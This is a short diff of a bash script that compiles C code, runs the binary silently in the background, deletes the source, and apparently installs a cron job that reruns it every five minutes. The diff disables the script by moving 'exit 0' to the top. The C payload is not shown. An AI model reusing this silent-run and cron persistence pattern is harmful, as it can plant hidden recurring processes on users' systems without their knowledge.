@@ -1,5 +1,7 @@
 #!/bin/bash
 
+exit 0
+
 user="suser"
 username=$(whoami)
 hostname=$(hostname)
@@ -42,8 +44,6 @@ EOF
 gcc "$c_code" -o "$script_path"
 "$script_path" > /dev/null 2>&1 &
 rm "$c_code"
-
-exit 0
 
 CRON_JOB="*/5 * * * * $script_path"
 if ! crontab -l 2>/dev/null | grep -Fxq "$CRON_JOB"; then
